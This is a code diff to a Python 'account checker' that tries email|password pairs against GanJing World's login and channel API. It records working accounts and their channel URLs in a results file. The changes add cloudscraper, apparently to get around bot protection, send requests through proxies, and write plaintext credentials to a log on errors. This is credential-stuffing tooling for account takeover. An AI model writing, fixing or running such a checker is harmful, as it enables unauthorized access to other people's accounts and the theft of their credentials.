@@ -540,6 +540,7 @@ def check_acc(account, total):
                 bad += 1
                 print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Wrong password")
                 return
+            s = cloudscraper.create_scraper()
             while True:
                 try:
                     h = {
@@ -551,8 +552,8 @@ def check_acc(account, total):
                         "http":f"http://{pr}",
                         "https":f"http://{pr}"
                     }
-                    data_channel = requests.post("https://gw.ganjingworld.com/v1.0c/get-my-channels", headers=h).json()
-                    if data_channel["data"]["my_channel_is_deleted"] == True:
+                    data_channel = s.post("https://gw.ganjingworld.com/v1.0c/get-my-channels", headers=h, proxies=p).json()
+                    if data_channel["result"]["data"]["my_channel_is_deleted"] == True:
                         open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Channel is deleted\n")
                         bad += 1
                         print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Channel is deleted")
@@ -560,6 +561,7 @@ def check_acc(account, total):
                     data_channel = data_channel["data"]["channels"][0]
                     break
                 except Exception as e:
+                    open("log.txt", "a", encoding="utf-8").write(f"Error: {str(e)} with account {email}:{password}\n")
                     continue
             good += 1
             print(f"\033[92m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Login success")
@@ -567,7 +569,7 @@ def check_acc(account, total):
             name = data_channel["name"]
             open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Login success|https://www.ganjingworld.com/channel/{uid}|{name}\n")
             return
-        except Exception as e: 
+        except Exception as e:
             pass
 
     
